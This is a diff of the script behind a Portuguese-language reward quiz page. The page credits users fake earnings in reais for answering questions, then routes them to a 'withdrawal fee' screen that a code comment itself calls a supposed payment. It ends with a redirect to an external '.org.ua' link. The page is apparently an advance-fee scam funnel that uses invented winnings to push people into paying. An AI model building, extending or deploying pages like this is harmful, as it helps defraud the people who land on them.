-    selected = false;
+    const q = perguntas[etapa];
+    title.innerText = q.titulo;
+    optionsBox.innerHTML = "";
+    selected = false;
+    btn.classList.remove("enabled"); // Garante que o botão comece desabilitado
 
-    q.opcoes.forEach(op => {
-        const div = document.createElement("div");
-        div.className = "option";
-        div.innerHTML = op;
-        div.onclick = () => {
-            document.querySelectorAll(".option").forEach(o => o.style.border = "1px solid #e5e5e5");
-            div.style.border = "2px solid #000";
-            selected = true;
-            btn.classList.add("enabled");
-        };
-        optionsBox.appendChild(div);
-    });
+    q.opcoes.forEach(op => {
+        const div = document.createElement("div");
+        div.className = "option";
+        div.innerHTML = op;
+        div.onclick = () => {
+            document.querySelectorAll(".option").forEach(o => o.style.border = "1px solid #e5e5e5");
+            div.style.border = "2px solid #000";
+            selected = true;
+            btn.classList.add("enabled");
+        };
+        optionsBox.appendChild(div);
+    });
 }
 
 btn.onclick = () => {
-    if (!selected) return;
+    if (!selected) return;
 
-    const valor = valores[etapa];
-    popupValor.innerText = "R$0,00";
-    popup.style.display = "flex";
+    const valor = valores[etapa];
+    popupValor.innerText = "R$0,00";
+    popup.style.display = "flex";
 
-    coinSound.currentTime = 0;
-    coinSound.play();
+    coinSound.currentTime = 0;
+    coinSound.play();
 
-    let atual = 0;
-    const anim = setInterval(() => {
-        atual += valor / 25;
-        if (atual >= valor) {
-            atual = valor;
-            clearInterval(anim);
-        }
-        popupValor.innerText = "R$" + atual.toFixed(2).replace(".", ",");
-        brilho(popupValor);
-    }, 30);
+    let atual = 0;
+    const anim = setInterval(() => {
+        atual += valor / 25;
+        if (atual >= valor) {
+            atual = valor;
+            clearInterval(anim);
+        }
+        popupValor.innerText = "R$" + atual.toFixed(2).replace(".", ",");
+        brilho(popupValor);
+    }, 30);
 
-    saldoAtual += valor;
-    saldoTopo.innerText = "R$" + saldoAtual.toFixed(2).replace(".", ",");
-    brilho(saldoTopo);
+    saldoAtual += valor;
+    saldoTopo.innerText = "R$" + saldoAtual.toFixed(2).replace(".", ",");
+    brilho(saldoTopo);
 };
 
 popupBtn.onclick = () => {
-    popup.style.display = "none";
-    etapa++;
+    popup.style.display = "none";
+    etapa++;
 
-    if (etapa >= perguntas.length) {
-        progressBar.style.width = "100%";
+    if (etapa >= perguntas.length) {
+        progressBar.style.width = "100%";
 
-        popupFinal.style.display = "flex";
+        popupFinal.style.display = "flex";
 
-        coinSound.currentTime = 0;
-        coinSound.play();
+        coinSound.currentTime = 0;
+        coinSound.play();
 
-        return;
-    }
+        return;
+    }
 
-    btn.classList.remove("enabled");
-    carregarPergunta();
+    btn.classList.remove("enabled");
+    carregarPergunta();
 };
 
 finalBtn.onclick = () => {
-    quizContainer.style.display = "none";
-    document.getElementById("popupFinal").style.display = "none";
-    resgateContainer.style.display = "block";
+    quizContainer.style.display = "none";
+    document.getElementById("popupFinal").style.display = "none";
+    resgateContainer.style.display = "block";
 
-    coinSound.currentTime = 0;
-    coinSound.play();
+    coinSound.currentTime = 0;
+    coinSound.play();
 };
 
 // 1. Botão da Tela de Resgate -> Tela de Taxa
 btnSaque.onclick = () => {
-    resgateContainer.style.display = "none";
-    taxaContainer.style.display = "block";
+    resgateContainer.style.display = "none";
+    taxaContainer.style.display = "block";
 };
 
 // 2. Botão da Tela de Taxa -> Tela de Envio
 btnTaxaSacar.onclick = () => {
-    // Avança para a tela de envio
-    taxaContainer.style.display = "none";
-    envioContainer.style.display = "block";
+    // Avança para a tela de envio (após o suposto pagamento)
+    taxaContainer.style.display = "none";
+    envioContainer.style.display = "block";
 };
 
-// *****************************************************************
 // 3. NOVO: Botão da Tela de Envio -> MOSTRA POP-UP DE CONQUISTA
 btnFinalizarEnvio.onclick = () => {
-    // Oculta a tela de envio e mostra o pop-up de conquista
-    envioContainer.style.display = "none";
-    popupConquista.style.display = "flex";
+    // Oculta a tela de envio e mostra o novo pop-up (conforme solicitado)
+    envioContainer.style.display = "none";
+    popupConquista.style.display = "flex";
 };
 
-// 4. NOVO: Botão do Pop-up de Conquista -> Redirecionamento
+// 4. NOVO: Botão do Pop-up de Conquista -> Redirecionamento Final
 btnConquista.onclick = () => {
-    window.location.href = "https://compraseguraonline.org.ua/c/d4df49a4ff";
+    // Redireciona para o link fornecido após o clique no pop-up
+    window.location.href = "https://compraseguraonline.org.ua/c/d4df49a4ff";
 };
-// *****************************************************************
-
 
 carregarPergunta();
 </script>
